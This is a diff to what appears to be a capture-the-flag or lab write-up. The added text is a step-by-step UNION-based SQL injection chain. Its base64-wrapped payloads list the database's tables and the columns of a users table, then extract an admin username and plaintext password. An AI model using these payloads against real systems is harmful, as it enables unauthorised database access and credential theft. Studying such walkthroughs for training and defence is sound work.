@@ -137,6 +137,36 @@ response:
 
 `|mysql|,|information_schema|,|performance_schema|,|sys|,|ezbox|`
 
+Now let's try to extract table name.
+
+payload: `data=<@base64>621729581 UNION SELECT 1, gRoUp_cOncaT(0x7c,table_name,0x7c), 2, 3 fRoM information_schema.tables<@/base64>`
+
+response:
+
+`|results|,|users|,|ADMINISTRABLE_ROLE_AUTHORIZATIONS|,|APPLICABLE_ROLES|,|CHARACTER_SETS|,|CHECK_CONSTRAINTS|,|COLLATIONS|,|COLLATION_CHARACTER_SET_APPLICABILITY|,|COLUMNS|,|COLUMNS_EXTENSIONS|,|COLUMN_PRIVILEGES|,|COLUMN_STATISTICS|,|ENABLED_ROLES|,|ENGINES|,|EVENTS|,|FILES|,|INNODB_BUFFER_PAGE|,|INNODB_BUFFER_PAGE_LRU|,|INNODB_BUFFER_POOL_STATS|,|INNODB_CACHED_INDEXES|,|INNODB_CMP|,|INNODB_CMPMEM|,|INNODB_CMPMEM_RESET|,|INNODB_CMP_PER_INDEX|,|INNODB_CMP_PER_INDEX_RESET|,|INNODB_CMP_RESET|,|INNODB_COLUMNS|,|INNODB_DATAFILES|,|INNODB_FIELDS|,|INNODB_FOREIGN|,|INNODB_FOREIGN_COLS|,|INNODB_FT_BEING_DELETED|,|INNODB_FT_CONFIG|,|INNODB_FT_DEFAULT_STOPWORD|,|INNODB_FT_DELETED|,|INNODB_FT_INDEX_CACHE|,|INNODB_FT_INDEX_TABLE|,|INNODB_INDEXES|,|INNODB_METRICS|,|INNODB_SESSION_TEMP_TABLESPACES|,|INNODB_TABLES|,|INNODB_TABLESPACES|,|INNODB_TABLESPACES_BRIEF|,|INNODB_TABLESTATS|,|INNODB_TEMP_TABLE_INFO|,|INNODB_TRX|,|INNODB_VIRTUAL|,|KEYWORDS|,|KEY_COLUMN_USAGE|,|OPTIMIZER_TRACE|,|PARAMETERS|,|PARTITIONS|,|PLUGINS|,|PRO`
+
+
+We have table with name `users` let's see the columns of this table.
+
+payload: `data=<@base64>621729581 UNION SELECT 1, gRoUp_cOncaT(0x7c,column_name,0x7c), 2, 3 fRoM information_schema.columns wHeRe table_name="users"<@/base64>`
+
+response:
+
+`|id|,|password|,|profile_picture|,|username|,|CURRENT_CONNECTIONS|,|TOTAL_CONNECTIONS|,|USER|`
+
+We have username and password here what should we do extract them!
+
+payload: `data=<@base64>621729581 UNION SELECT 1, gRoUp_cOncaT(0x7c,username,0x7c), 2, 3 fRoM users<@/base64>`
+
+response: `|Admin|`
+
+username=Admin
+
+payload: `data=<@base64>621729581 UNION SELECT 1, gRoUp_cOncaT(0x7c,password,0x7c), 2, 3 fRoM users<@/base64>`
+
+response: `|zohl8meicohci9raw0|`
+
+password=zohl8meicohci9raw0
 
 
 
